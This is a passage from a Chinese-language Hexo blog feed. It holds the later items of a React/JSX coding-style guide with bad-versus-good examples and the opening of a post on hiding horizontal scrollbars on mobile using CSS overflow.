class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* CSS 文件 */</span></span><br><span class="line">.<span class="property">body</span> &#123;</span><br><span class="line">  <span class="attr">height</span>: 10px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JSX</span></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">className</span>=<span class="string">&quot;body&quot;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bodyStyle = &#123;</span><br><span class="line">  <span class="attr">height</span>: <span class="string">&quot;10px&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">style</span>=<span class="string">&#123;bodyStyle&#125;</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p><a name="CAVWX"></a></p><h3 id="8-使用对象解构"><a href="#8-使用对象解构" class="headerlink" title="8. 使用对象解构"></a>8. 使用对象解构</h3><p>充分利用对象解构。假设你需要显示一个用户的详细信息。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;user.name&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;user.age&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;user.profession&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; name, age, profession &#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;name&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;age&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;profession&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="yjiet"></a></p><h3 id="9-字符串类型的-props-不需要花括号"><a href="#9-字符串类型的-props-不需要花括号" class="headerlink" title="9. 字符串类型的 props 不需要花括号"></a>9. 字符串类型的 props 不需要花括号</h3><p>当向子组件传递字符串类型的 props 时。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">title</span>=<span class="string">&#123;</span>&quot;<span class="attr">My</span> <span class="attr">Special</span> <span class="attr">App</span>&quot;&#125; /&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">title</span>=<span class="string">&quot;My Special App&quot;</span> /&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="JsPzu"></a></p><h3 id="10-从-JSX-中提取-JS-代码"><a href="#10-从-JSX-中提取-JS-代码" class="headerlink" title="10. 从 JSX 中提取 JS 代码"></a>10. 从 JSX 中提取 JS 代码</h3><p>如果 JS 代码没有渲染或 UI 功能目的,请将其从 JSX 中提取出来。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;posts.map(post =&gt; (</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">onClick</span>=<span class="string">&#123;event</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">        console.log(event.target, &#x27;clicked!&#x27;); // &lt;- 不好的</span></span><br><span class="line"><span class="language-xml">      &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      key=&#123;post.id&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">      &#123;post.title&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  ))&#125;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">);</span></span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onClickHandler</span> = event =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">target</span>, <span class="string">&#x27;clicked!&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;posts.map(post =&gt; (</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">onClick</span>=<span class="string">&#123;onClickHandler&#125;</span> <span class="attr">key</span>=<span class="string">&#123;post.id&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;post.title&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  ))&#125;</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="V9qNh"></a></p><h3 id="11-使用模板字符串"><a href="#11-使用模板字符串" class="headerlink" title="11. 使用模板字符串"></a>11. 使用模板字符串</h3><p>使用模板字符串构建大型字符串。避免使用字符串连接。它很漂亮,也很简洁。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userDetails = user.<span class="property">name</span> + <span class="string">&quot;&#x27;s profession is&quot;</span> + user.<span class="property">profession</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;userDetails&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> userDetails = <span class="string">`<span class="subst">$&#123;user.name&#125;</span>&#x27;s profession is <span class="subst">$&#123;user.profession&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span>&#123;userDetails&#125;<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="UytTJ"></a></p><h3 id="12-按顺序导入"><a href="#12-按顺序导入" class="headerlink" title="12. 按顺序导入"></a>12. 按顺序导入</h3><p>尽量按一定顺序导入东西。这提高了代码的可读性。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ErrorImg</span> <span class="keyword">from</span> <span class="string">&#x27;../../assets/images/error.png&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&#x27;styled-components/native&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> colors <span class="keyword">from</span> <span class="string">&#x27;../../styles/colors&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PropTypes</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong><br />一个经验法则是保持导入顺序如下:</p><ul><li>内置的</li><li>外部的</li><li>内部的</li></ul><p>所以上面的例子变为:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PropTypes</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&#x27;styled-components/native&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ErrorImg</span> <span class="keyword">from</span> <span class="string">&#x27;../../assets/images/error.png&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> colors <span class="keyword">from</span> <span class="string">&#x27;../../styles/colors&#x27;</span>;</span><br></pre></td></tr></table></figure><p><a name="LvEZy"></a></p><h3 id="13-使用隐式返回"><a href="#13-使用隐式返回" class="headerlink" title="13. 使用隐式返回"></a>13. 使用隐式返回</h3><p>在编写漂亮的代码时,使用 JavaScript 的隐式<strong>return</strong>特性。假设你的函数进行一个简单的计算并返回结果。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; a + b;</span><br></pre></td></tr></table></figure><p><a name="mzkhz"></a></p><h3 id="14-组件命名"><a href="#14-组件命名" class="headerlink" title="14. 组件命名"></a>14. 组件命名</h3><p>组件始终使用 PascalCase,实例使用 camelCase。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> reservationCard <span class="keyword">from</span> <span class="string">&#x27;./ReservationCard&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ReservationItem</span> = <span class="language-xml"><span class="tag">&lt;<span class="name">ReservationCard</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ReservationCard</span> <span class="keyword">from</span> <span class="string">&#x27;./ReservationCard&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> reservationItem = <span class="language-xml"><span class="tag">&lt;<span class="name">ReservationCard</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure><p><a name="SU0Nj"></a></p><h3 id="15-保留的-prop-命名"><a href="#15-保留的-prop-命名" class="headerlink" title="15. 保留的 prop 命名"></a>15. 保留的 prop 命名</h3><p>不要在组件之间传递 props 时使用 DOM 组件的 prop 名称,因为其他人可能不期望这些名称。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">MyComponent</span> style=<span class="string">&quot;dark&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">MyComponent</span> <span class="attr">className</span>=<span class="string">&quot;dark&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">MyComponent</span> variant=<span class="string">&quot;fancy&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p><a name="uTbMW"></a></p><h3 id="16-引号"><a href="#16-引号" class="headerlink" title="16. 引号"></a>16. 引号</h3><p>JSX 属性使用双引号,其他所有 JS 使用单引号。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Foo</span> bar=<span class="string">&#x27;bar&#x27;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Foo</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">left:</span> &quot;<span class="attr">20px</span>&quot; &#125;&#125; /&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Foo</span> bar=<span class="string">&quot;bar&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Foo</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">left:</span> &#x27;<span class="attr">20px</span>&#x27; &#125;&#125; /&gt;</span></span></span><br></pre></td></tr></table></figure><p><a name="hY884"></a></p><h3 id="17-prop-命名"><a href="#17-prop-命名" class="headerlink" title="17. prop 命名"></a>17. prop 命名</h3><p>始终使用 camelCase 作为 prop 名称,如果 prop 值为 React 组件,则使用 PascalCase。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Component</span></span><br><span class="line">  <span class="title class_">UserName</span>=<span class="string">&quot;hello&quot;</span></span><br><span class="line">  phone_number=&#123;<span class="number">12345678</span>&#125;</span><br><span class="line">  /&gt;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">MyComponent</span></span><br><span class="line">  userName=<span class="string">&quot;hello&quot;</span></span><br><span class="line">  phoneNumber=&#123;<span class="number">12345678</span>&#125;</span><br><span class="line">  <span class="title class_">Component</span>=&#123;<span class="title class_">SomeComponent</span>&#125;</span><br><span class="line">  /&gt;</span><br></pre></td></tr></table></figure><p><a name="n4HuJ"></a></p><h3 id="18-把多行的-JSX-用括号包裹"><a href="#18-把多行的-JSX-用括号包裹" class="headerlink" title="18. 把多行的 JSX 用括号包裹"></a>18. 把多行的 JSX 用括号包裹</h3><p>如果组件跨多行,请始终将其包装在括号中。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">MyComponent</span> <span class="attr">variant</span>=<span class="string">&quot;long&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">MyChild</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">MyComponent</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">MyComponent</span> <span class="attr">variant</span>=<span class="string">&quot;long&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">MyChild</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">MyComponent</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="YHwiP"></a></p><h3 id="19-使用自闭合标签"><a href="#19-使用自闭合标签" class="headerlink" title="19. 使用自闭合标签"></a>19. 使用自闭合标签</h3><p>如果组件没有子元素,则使用自闭合标签。这提高了可读性。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">SomeComponent</span> variant=<span class="string">&quot;stuff&quot;</span>&gt;&lt;/<span class="title class_">SomeComponent</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">SomeComponent</span> variant=<span class="string">&quot;stuff&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p><a name="wwbum"></a></p><h3 id="20-方法名中不要使用下划线"><a href="#20-方法名中不要使用下划线" class="headerlink" title="20. 方法名中不要使用下划线"></a>20. 方法名中不要使用下划线</h3><p>不要在任何内部 React 方法中使用下划线。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">_onClickHandler</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// do stuff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onClickHandler</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// do stuff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="ZAxYA"></a></p><h3 id="21-alt-属性"><a href="#21-alt-属性" class="headerlink" title="21. alt 属性"></a>21. alt 属性</h3><p>在**<img><strong>标签中始终包含 alt 属性。并且不要在 alt 属性中使用</strong>picture<strong>或</strong>image**,因为屏幕阅读器已经将<strong>img</strong>元素宣布为图像。不需要包含它们。<br /><strong>「不好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;hello.jpg&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;hello.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Picture of me waving hello&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>「好的:」</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;hello.jpg&quot;</span> alt=<span class="string">&quot;Me waving hello&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐藏移动端滚动条的几种方案</title>
      <link href="/2024/05/22/compatible/yin-cang-yi-dong-duan-gun-dong-tiao-de-ji-chong-fang-an/"/>
      <url>/2024/05/22/compatible/yin-cang-yi-dong-duan-gun-dong-tiao-de-ji-chong-fang-an/</url>
      
        <content type="html"><![CDATA[<p>在移动端开发中，经常会碰到需要横向滚动的场景，例如这样的<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/gif/1548284/1705027839311-03fa28eb-d522-41ce-8063-31739aa4d4d2.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/gif/1548284/1705027839311-03fa28eb-d522-41ce-8063-31739aa4d4d2.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />你可能想到直接设置滚动条样式就可以了，就像这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">::-webkit-scrollbar &#123;</span><br><span class="line">  display: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前来看好像没什么问题，但在某些版本的 iOS 上却无效（具体待测试），滚动条仍然出现。<br />那有没有其他方式可以解决这个问题呢？下面介绍几个方法<br><a name="loxpC"></a></p><h2 id="一、通过-overflow-隐藏"><a href="#一、通过-overflow-隐藏" class="headerlink" title="一、通过 overflow 隐藏"></a>一、通过 overflow 隐藏</h2><p>既然有时候修改滚动条样式无法解决，我们可以想办法把它隐藏。<br />下面是一个横向滚动列表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>简单修饰一下，让这个列表可以横向滚动</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.list</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">  <span class="attribute">gap</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.item</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">background</span>: royalblue;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717657130935-38171e11-eab4-4b2a-b011-90d54e33f578.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1717657130935-38171e11-eab4-4b2a-b011-90d54e33f578.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />通过<strong>「overflow」</strong>隐藏的方式很简单，我们需要一个父级</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrap&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span 